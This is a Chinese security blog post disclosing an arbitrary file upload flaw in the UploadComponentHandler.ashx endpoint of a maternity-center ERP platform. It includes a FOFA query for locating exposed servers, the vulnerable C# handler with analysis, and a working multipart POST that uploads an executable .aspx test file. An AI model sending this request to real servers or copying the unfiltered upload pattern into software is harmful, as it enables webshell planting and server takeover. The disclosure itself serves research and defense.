---
title: "月子会所ERP管理云平台 UploadComponentHandler.ashx 任意文件上传漏洞"
source: https://mrxn.net/jswz/mamabaohe-UploadComponentHandler-rce.html
asset_dir: assets/月子会所erp管理云平台-uploadcomponenthandler.ashx-任意文件上传漏洞
---

# 月子会所ERP管理云平台 UploadComponentHandler.ashx 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/2/23 08:40
* 654浏览
* [0评论](#comment)
* 1小时阅读

深入探索

安全认证考试

编码转换工具

云安全解决方案


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

月子会所ERP管理云平台是由武汉金同方科技有限公司研发团队结合行业月子中心相关企业需求开发的一套综合性管理软件。月子会所ERP管理云平台的 Page/UploadComponent/UploadComponentHandler.ashx 和 Page/upload/UploadComponentHandler.ashx 接口存在[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，攻击者可利用该漏洞上传webshell获取服务器权限。

漏洞预警服务

# fofa语法

> `body="月子护理ERP管理平台" || body="妈妈宝盒客户端.rar" || body="Page/Login/Login3.aspx" || app="妈妈宝盒-ERP"`

# 漏洞分析

两处出发路径的代码逻辑实现一样，直接看 UploadComponentHandler 的业务逻辑实现

```
<%@ WebHandler Language="C#" Class="UploadComponentHandler" %>

using System;
using System.Web;
using System.IO;
using System.Configuration;

public class UploadComponentHandler : IHttpHandler {

    // static string OosUrl = ConfigurationManager.AppSettings["OosUrl"]+"/";//OOS上传域名地址
    static string OOsUrl = ConfigurationManager.AppSettings["uploadOosUrl"];//OOS上传根目录地址
    static string url =""; //定义原图上传文件路径
    static string Slturl =""; //定义缩略图上传文件路径
    static string ErpUrl = ConfigurationManager.AppSettings["uploadErpUrl"];//本地上传根目录下文件夹
    static string UploadPosition = ConfigurationManager.AppSettings["UploadPosition"];//上传位置(0:表示本地服务器,1:表示OOS)
    static string BdSltUrl = "UploadBaseFolder/Thumbnail";//存储缩略图的本地文件路径根目录文件夹
    static string BdYtUrl = "UploadBaseFolder";//存储缩原图的本地文件路径根目录文件夹
    public void ProcessRequest(HttpContext context)
    {
        context.Response.ContentType = "text/plain";
        string UploadPositionType = "";
        RequestG.GetParams("UploadPositionType", ref UploadPositionType);
        if (!string.IsNullOrEmpty(UploadPositionType))
        {
            UploadPosition = UploadPositionType;//根据上传模块的需求来设置上传位置的参数,可以设置固定上传到oos或者本地
        }
        if (UploadPosition == "1")//根据webConfig里面参数配置,当为1的时候上传到OOs服务器
        {
            url=OOsUrl+"/"+DateTime.Now.ToString("yyyyMM")+"/"; //定义OOs上传文件路径
        }
        else
        {
            url=ErpUrl+"/"+DateTime.Now.ToString("yyyyMM")+"/"; //定义本地ERP上传文件路径
            Slturl=BdSltUrl+"/"+ErpUrl+"/"+DateTime.Now.ToString("yyyyMM")+"/"; //定义本地ERP上传文件路径
        }
        string a = "";
        try
        {
            HttpFileCollection file = context.Request.Files;//获取选中的文件
            for (int i = 0; i < file.Count; i++)
            {
                string cFileName = Path.GetFileName(file[i].FileName.Trim());
                string tuozhanming = cFileName.Substring(cFileName.LastIndexOf(".")).ToLower();     //拓展名
                string fileName = cFileName.Substring(0, cFileName.LastIndexOf(".")).ToLower();     //没有拓展名文件名称
                string newname = GetNewName(fileName,tuozhanming);//新的文件名称                                                                           

                string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(file[i].FileName.Trim());
                string cFileType = Path.GetExtension(file[i].FileName.Trim());
                if (file == null || string.IsNullOrWhiteSpace(file[i].FileName) || file[i].ContentLength == 0 || cFileType.Length < 2)
                {
                    a = "{\"code\":\"0\",\"src\":\"\",\"name\":\"\",\"msg\":\"上传失败\"}";
                    context.Response.Write(a);
                }
                string tmp = file[i].FileName.Trim();
                if (UploadPosition == "1")//根据webConfig里面参数配置,当为1的时候上传到OOs服务器
                {
                    System.IO.Stream strem = file[i].InputStream;//将所要上传文件转换成流
                    OosUpload.PutObjectFromFile(url,newname, strem);//上传文件至oos
                    a = "{\"code\":\"1\",\"src\":\""+ url + newname + "\",\"name\":\"" + newname + "\",\"msg\":\"上传成功\"}";
                }
                else //上传到本地服务器
                {
                    var basepath = context.Server.MapPath("../../" + BdYtUrl + "/" + url);//原图绝对路径
                    if (!Directory.Exists(basepath))
                    {
                        Directory.CreateDirectory(basepath);
                    }
                    HttpPostedFile mypost = file[i];
                    mypost.SaveAs(string.Format("{0}/{1}", basepath, newname));//保存文件

                    var baseSltpath = context.Server.MapPath("../../" + Slturl);//原图绝对路径
                    if (!Directory.Exists(baseSltpath))
                    {
                        Directory.CreateDirectory(baseSltpath);
                    }
                    if (tuozhanming==".png"||tuozhanming==".jpg"||tuozhanming==".jepg"||tuozhanming==".bmp") {//图片才需要压缩,其它文件不需要压缩

                        w_Base.MakeThumbnail(context.Server.MapPath("../../" + BdYtUrl + "/" + url + "/" + newname), context.Server.MapPath("../../" + Slturl + "/" + newname), 120, 130, "DB");
                    }

                    a = "{\"code\":\"1\",\"src\":\"" + BdYtUrl + "/" + url + newname + "\",\"name\":\"" + newname + "\",\"msg\":\"上传成功\"}";
                }
                System.Threading.Thread.Sleep(1000);

                context.Response.Write(a);
            }
        }
        catch (Exception)
        {
            a = "{\"code\":\"-1\",\"src\":\"\",\"name\":\"\",\"msg\":\"上传出错\"}";
            context.Response.Write(a);
        }
    }

    public string GetNewName(string fileName, string name)
    {
        string time = DateTime.Now.ToString("yyMMddHHmmssffff");
        return fileName + "_" + time + new Random().Next(000, 999) + name;
    }

    public bool IsReusable {
        get {
            return false;
        }
    }

}
```

其实注释已经很清楚了

物流软件安全

```
static string UploadPosition = ConfigurationManager.AppSettings["UploadPosition"];//上传位置(0:表示本地服务器,1:表示OOS)
```

这里根据配置文件里的 UploadPosition 值来决定上传到本地还是OOS上，大多数都是本地。且下面又根据请求参数 UploadPositionType 来重新设置上传位置

```
string UploadPositionType = "";
        RequestG.GetParams("UploadPositionType", ref UploadPositionType);
        if (!string.IsNullOrEmpty(UploadPositionType))
        {
            UploadPosition = UploadPositionType;//根据上传模块的需求来设置上传位置的参数,可以设置固定上传到oos或者本地
        }
```

因此我们只需要在请求中设置 UploadPositionType=0 即可上传到服务器本地。

剩下的就是常规的上传、重命名、对图片后缀进行缩略图处理等，并无特殊后缀过滤，且会回显上传文件路径，造成任意文件上传[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
POST /Page/upload/UploadComponentHandler.ashx?UploadPositionType=0 HTTP/1.1
Host: mamabaohe.mrxn.net
Content-Type: multipart/form-data; boundary=--WebKitFormBoundaryWPL35TV23dfr1cNr

--WebKitFormBoundaryWPL35TV23dfr1cNr
Content-Disposition: form-data; name="file"; filename="t.aspx"

<%@Page Language="C#"%><%Response.Write(DateTime.Now.ToString());System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath));%>
--WebKitFormBoundaryWPL35TV23dfr1cNr--
```

[![月子会所ERP管理云平台 UploadComponentHandler.ashx 任意文件上传漏洞](images/img-001-4bd743c72667.webp)](https://image.mrxn.net/38ecadd2242b4043a9c07b07426933c4.webp)

成功上传测试POC并回显文件路径。

漏洞预警服务

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.fofa语法](#toc-2-)
* [3.漏洞分析](#toc-3-)
* [4.漏洞复现](#toc-4-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[月子会所ERP管理云平台 UploadComponentHandler.ashx 任意文件上传漏洞](https://mrxn.net/jswz/mamabaohe-UploadComponentHandler-rce.html)  
文章链接：<https://mrxn.net/jswz/mamabaohe-UploadComponentHandler-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/mamabaohe-UploadComponentHandler-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

文件大小转换

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALRElEQVR4Aeyci3bjxhFEef3//7xxq3zBmQYG4MpekecEOpkU6tGN4TQQreSN/3o8Hr++s37989Vr/5F3PdWv0H6rnL54lFt56uJR7aiZE0dvvO6+/DtYA/m77v7Pp5zANpC/J/54Za02bi3wALZe5iH6q9zcFUL6whPdi7UQb6X3HBznVzn1jt7vCse6bSCjeF+/7wR2A4E8HTDj1RYheXMQ3p8OiL7KqXeE1PV+I7+qgfQwZ23n6pC8vOfkVwjpAzMe1e0GchS6tZ87gX89kNXTow55KlYfqefk5mGuh3AImivstZ1X5mhBekGwZyA6BLv/6n163RH/1wM5anpr3z+BHxsI5OnqTxNE9yNAOAR73pwIycE19l6QGnXR3nJRXVzp+t/BHxvIdzb3/1izG4hT77g6HJifMuDBsKyzn7yjvtj9zs0dYc9ecchngGDPQ3TvBeE9t+LWdTzK7wZyFLq1nzuBbSCQqcM5vro1n4aeh/R/1YfX8kC/1e63BT3Q9yAHvn7b0PMrDsd5iA7nOPbdBjKK9/X7TuAvn4rfxb5lyFOgDuH2VZfD7MM5t76j/Qq7B3NP/crWkn8X4bx/3eN31/2GfHcaf6huNxDI1GFG7w/R5a8izHU+ORD9ivf7QOpgj1fZ7sshvVZ7MacvQurgGK0T4TgHPHYDedxfbz2Bv2CellMX3R0kpw7h+h3NqcshdRBUNydCfLnY8/LCVzKVg7l3aeNa9YG5bpVT7wipH+/Vr+83pJ/am/nuT1mQKbovJyiH+F3XX+n6ojlIv67ri4/H4ysCc/5LvPgvSA0E7QnhcI6273XqkHp9Ub8jJA97vN+Qflpv5rvvIX0/kCmqO32ILhfNQfxX+SqnvkLIfYBdxD117MErH/j6yR2Cq3qYfftCdHnHsd/9hoyn8QHXu4E4PfcmF2GeNoRDsNfBrHffvuodIfUQ7L71hd2Tw1wL4VVTa5Urr5a+WFotSB8IllbLnFhaLUgOgvoj7gYymvf1z5/ANpCaYC23AJkiBNUrU6vz0mrBa3nrYc6ri9VzXOq/g9avaiB76DmIvqpTtw6ShxnNieY7L30biOaN7z2B7ecQOJ5qTa2W24TjnH5HSL7r8updC5Kr61r6EB2C6pWpJT9CSA0EjzKjBslV33GZUYPk1CFcX9QXuw6pgyfeb4in9SG4DcTpdYRMz/2ufEhO/yqvv0JIP/3eF+LDE81CNGtEfTnw4O8l1+/Y/c7NQ+4rNwfRIah/hNtAjsxb+/kT2AYCmR4E3cp3ply1kD4wY3mvLO8rQvrIxbHXkTb6kB5q5iG6XB+iw4z6onW